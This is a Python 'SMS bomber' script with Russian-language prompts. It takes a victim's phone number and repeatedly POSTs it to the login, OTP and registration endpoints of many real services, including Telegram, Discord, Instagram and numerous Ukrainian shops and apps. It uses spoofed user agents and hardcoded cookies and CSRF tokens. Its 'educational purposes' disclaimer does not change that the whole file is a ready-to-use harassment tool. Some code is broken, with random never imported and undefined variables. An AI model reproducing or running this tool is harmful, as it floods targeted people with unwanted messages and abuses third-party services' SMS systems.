#----------------------------------------------------------------
import requests,fake_useragent,time,os,threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#----------------------------------------------------------------
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')
#----------------------------------------------------------------
def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiodfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiodfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email
    phone_plus = "+" + number
#----------------------------------------------------------------
with open('лого.txt', 'r') as file:
    read_file = file.read()
def out_red(text):
    console.print("[blue]SPAMMER SPAMMER SPAMMER SPAMMER SPAMMER SPAMMER SPAMMER")
    print("                                              ")
    print("\033[32m{}".format(text))
    print("               ")
    console.print('''[red]               ©SPAMMER©''')
out_red(read_file)   
#----------------------------------------------------------------
console.print('''
[red]
!!!The creator is not responsible for your actions. This program was created for educational purposes. !!!
(created by GEEK using python3)            
''')
console.print('''[green]
 Telegram_GROUP - [purple] https://t.me/GEEK_GROUP_123
 [green]
  My_YouTube_channel -[purple] https://www.youtube.com/channel/UCVBFn5D1N_awrQN5oMRJEZQ 
       [green]              SUBSCRIBE PLEASE
''')
#----------------------------------------------------------------
console.print('[yellow] Введите  номер телефонa (+можно не писать) ')

number = console.input('[green]GEEK>>> ')
#----------------------------------------------------------------
run = int(console.input('[purple]Введите количество повторов (1-10):\n[green]GEEK>>> '))
#----------------------------------------------------------------
for _ in track(range(run)):
         headers = {"User-Agent": fake_useragent.UserAgent().random}
         try:#ok
                 requests.post("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxies=proxies)
                 console.print('[green]multiplex.ua')
         except:
                 console.print('[red]Не отправлено (multiplex.ua)')

         try:#ok
                 requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers)
                 console.print('[green]bi.ua')
         except:
                 console.print('Не отправлено (bi.ua)')
         try:#ok
                 requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers)
                 console.print('[green]ctrs')
         except:
                 console.print('Не отправлено (ctrs)')
         try:#ok
                 requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
                 console.print('[green]telegram')
         except:
                 console.print('Не отправлено (telegram)')
         try:#no
                 requests.post("https://u.icq.net/api/v70/rapi/auth/sendCoden", params={"phone": number, "devId": "ic1rtwz1s1Hj1O0r"}, headers=headers)
                 console.print('[green]icq')
         except:
                console.print('Не отправлено (icq)')
         try:#ok/no
                 requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers)
                 console.print('[green]discord')
         except:
                 console.print('Не отправлено (discord)')
         try:#ok
                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
                 console.print('[green]vodafone')
         except:
                 console.print('Не отправлено (vodafone)')
         try:#ok
                 requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers)
                 console.print('[green]megasport')
         except:
                 console.print('Не отправлено (megasport)')
         try:#ok
                 requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers)
                 console.print('[green]zolotakoroleva.ua')
         except:
                 console.print('Не отправлено (zolotakoroleva.ua)')
         try:#ok
                 requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers)
                 console.print('[green]mozayka.com.ua')
         except:
                 console.print('Не отправлено (mozayka.com.ua)')
         try:#ok
                 requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers)
                 console.print('[green]kazan-divan.eatery.club')
         except:
                 console.print('Не доставлено (kazan-divan.eatery.club)')
         try:#ok
                 requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers)
                 console.print('[green]groshivsim.com')
         except:
                 console.print('Не отправлено (groshivsim.com)')
         try:#ok
                 requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers)
                 console.print('[green]money4you.ua')
         except:
                 console.print('Не отправлено (money4you.ua)')
         try:
                 requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': number}, headers={'accept-encoding':'gzip, deflate, br', 'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/x-www-form-urlencoded', 'cookie':'ig_did=06389D42-D5BA-42C2-BCA6-49C2913D682B; csrftoken=SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL; mid=XyIqeAALAAF1N7j0GbPCNuWhznuX; rur=FRC; urlgen="{\"109.252.48.249\": 25513\054 \"109.252.48.225\": 25513}:1k5JBz:E-7UgfDDLsdtlKvXiWBUphtFMdw"','referer':'https://www.instagram.com/accounts/password/reset/', 'origin':'https://www.instagram.com','user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95 (Edition Yx)','x-csrftoken':'SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL', 'x-ig-app-id':'936619743392459','x-instagram-ajax': 'a9aec8fa634f', 'x-requested-with': 'XMLHttpRequest'})
                 console.print('[green]instagram.com')
         except:
                 console.print('Не отправлено (instagram.com)')
         try:
                 requests.post('https://cabinet.taximaxim.ru/Services/Public.svc/api/v2/login/code/droppedcall/send?device=Xiaomi%2FMi+9T+Pro%2F10&locale=uk&source=playmarket&city=297&udid=ef94a46599d0e604&version=3.12.20&density=xxhdpi&platform=CLAPP_ANDROID&latitude=48.2552685&radius=47.861&rt=154436.516&longitude=25.9334519&sig=1411965450e7f390089c2cfab52ef029', json={'locale': 'uk','phone': number,'type':'droppedcall','smstoken':'vEMdSjfFO6R','isDefault':'1','mcc':'255'}, headers={'X-Requested-With':'XMLHttpRequest', 'Accept-Charset':'UTF-8', 'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 10; Mi 9T Pro MIUI/V12.0.6.0.QFKMIXM)', 'X-Client-RequestTimeout':'10', 'Dark-Theme':'false', 'Url-Scheme':'maximzakaz', 'Connection':'Connection', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'DNT':'1'})
                 console.print('[green]cabinet.taximaxim.ru')
         except:
                 console.print('Не отправлено (cabinet.taximaxim.ru)')

         try:
                 requests.post('https://dnipro-m.ua/uk/phone-verification/', data={'phone': number}, headers={'X-Requested-With':'XMLHttpRequest', 'x-xss-protection': '1; mode=block', 'cookie': 'PHPSESSID=mjgof64ae33gd9g4rpto23utbs; session_hash=ecf0f036b9519cd8eae6640d1cb07bc2; gclid=939156d81035356c746423ecca0a2cf4a2748f879bd3dc65cfa6250fb7064ccea%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22gclid%22%3Bi%3A1%3Bs%3A8%3A%22dnipro-m%22%3B%7D; language=0480298520a8be04ccfd813520616a13a8aa0fb2db683a1126b77f187eca16c3a%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22uk%22%3B%7D; translations_pushed=92f83c1f3a434aeae744854c974cdb236df315cbe39e518ed7234b1ea9a0cd88a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22translations_pushed%22%3Bi%3A1%3Bi%3A1%3B%7D; _csrf-frontend=bef2130445b5ccea33c7703f35273eab653c9ac5572def7b93a0fb02b25a556ca%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22SqzDL32pQojiQqc2Y50FzsdgD6Pmq8ma%22%3B%7D; _gcl_au=1.1.271637781.1635439209; _gcl_aw=GCL.1635439211.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB; ab_1=2; _gid=GA1.2.377104572.1635439214; _dc_gtm_UA-87493814-1=1; _hjid=1ba8c8eb-f5de-4eb6-b07d-54a7b2e30c70; _hjFirstSeen=1; sc=C91E5BF3-A5C7-774E-FA5A-76E87C65E828; _gat_UA-87493814-1=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_1QMTESJ6M0=GS1.1.1635439214.1.0.1635439215.59; _ga=GA1.2.2011064152.1635439214; __zlcmid=16mkRHVrtBTC1Fc; _gac_UA-87493814-1=1.1635439240.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'referer': 'https://dnipro-m.ua/uk/?gclid=Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'x-csrf-token': 'koW-Ul6Vmcd9-M963uo7FTOT3bZQyePOrFDxs4Si7S3B9MQWEqartyyXpROPm1gnaqbt8Cq6h6noZqHe9ZqATA==', 'x-requested-with': 'XMLHttpRequest', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 console.print('[green]dnipro-m.ua')
         except:
                 console.print('Не отправлено (dnipro-m.ua)')
         try:
                 requests.post('https://rider.uklon.com.ua/api/v1/phone/send-code', json={'username':'+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-correlation-id': 'c3208fdf-4dd7-4bca-aa84-2c686c1e2f60', 'sentry-trace': '796731cc91f54825a3e0435bebc67587-a104fb30d8b1adfc-1', 'uklon-agent': 'UklonPwa/1.16.0.182484', 'referer': 'https://m.uklon.com.ua/', 'locale': 'uk', 'client_id': '04F2BB99734848E1A061140A7452D1A9', 'app_uid': '9e33ffae-0ffd-4361-8bed-869b9ec94cb1', 'city': 'kyiv', 'cf-ray': '6a7f973a9ac12319-KBP', 'content-length': '0', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 console.print('[green]uklon.com.ua')
         except:
                 console.print('Не отправлено (uklon.com.ua)')
         try:
                 requests.post('https://ucb.z.apteka24.ua/api/send/otp', json={'phone':number}, headers={'X-Requested-With':'XMLHttpRequest', 'link': '<https://ucb.z.apteka24.ua/api/docs.jsonld>; rel="http://www.w3.org/ns/hydra/core#apiDocumentation"', 'server': 'nginx/1.17.10', 'vary': 'Accept', 'x-content-type-options': 'nosniff', 'x-frame-options': 'deny', 'x-powered-by': 'PHP/7.4.21', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache, private', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 console.print('[green]apteka24.ua')
         except:
                 console.print('Не отправлено (apteka24.ua)')
         try:
                 requests.post('https://anc.ua/authorization/auth/v2/register', json={'login':'+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'server': 'cloudflare', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-content-type-options': 'nosniff', 'x-frame-options': 'DENY', 'x-xss-protection': '1; mode=block' , 'cookie': 'i18n_redirected=ru; sc=78E5A248-BB67-8529-17FB-C576B2F0C2C6; _gid=GA1.2.932161565.1636350376; _ga=GA1.2.323331122.1636350376; _gcl_au=1.1.1182428524.1636350380; _hjid=b16352a7-11da-4f6f-964a-b39c79b0686e; _hjFirstSeen=1; _hjAbsoluteSessionInProgress=0; _clck=1sxn18j|1|ew9|0; _clsk=oley8v|1636350383248|1|1|e.clarity.ms/collect; _ga_36VHWFTBMP=GS1.1.1636350372.1.1.1636350470.60; _dc_gtm_UA-169190421-1=1', 'referer': 'https://anc.ua/ru', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache, no-store, max-age=0, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 console.print('[green]anc.ua')
         except:
                 console.print('Не отправлено (anc.ua)')
 
         try:
                 requests.post('https://cabinet.skarb.com.ua/user/register', data={'_csrf': 'mG9Ke7hr_W-jNPBrIONmoYcy4_yhohb65oCkznNj2RruKnw13wWJG-htyAdkmwH3wEW2xcfjTMit5pGlKRXgLA==','login': '+' + number,'password': 'as23Afs312','subscribe': '0','subscribe': '1'}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=300;', 'cookie': 'PHPSESSID=9caf7faf4ea190ac1af68c81cf564e12; _csrf=bdcd3f1b1d4fcd9630fbccd675c6c621e778b9dc164ae0b824a47490bc77b251a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22vE6NgnttKY8lDxgVGwU9fAZ2Kf5kZv96%22%3B%7D; _hjid=ac40cfb3-3566-4f11-80e6-03fa308b762c; _hjFirstSeen=1; _ga=GA1.3.1320069702.1635787230; _gid=GA1.3.666518449.1635787230; _gat_UA-168694557-1=1; label_entry=ascbiiu; _hjAbsoluteSessionInProgress=0; carrotquest_device_guid=46f523f6-661a-40db-a58f-1f08a03ba975; carrotquest_uid=1037496607563582470; carrotquest_auth_token=user.1037496607563582470.20750-1fe4d375c930f1f6c1c80e0db5.5cd10bb1f419ffc0f8a08c1b206fffc14213b56ba506f318; carrotquest_realtime_services_transport=wss; carrotquest_session=iu41d6pco8da14aputbtp7l5snvrtc9l; carrotquest_session_started=1', 'referer': 'https://cabinet.skarb.com.ua/user/register', 'upgrade-insecure-requests': '1', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'max-age=0', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 console.print('[green]cabinet.skarb.com.ua')
         except:
                 console.print('Не отправлено (cabinet.skarb.com.ua)')

         try:
                 requests.post('https://api.telemed.care/oauth/verify_phone_number', json={"phone_number": number}, headers={'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.14.8'})
                 console.print('[green]telemed.care')
         except:
                 console.print('Не доставлено (telemed.care)')

         try:
                 requests.post('https://my.telegram.org/auth/send_password', json={"phone": number})
                 console.print('[green]telegram')
         except:
                 console.print('Не доставлено (telegram)')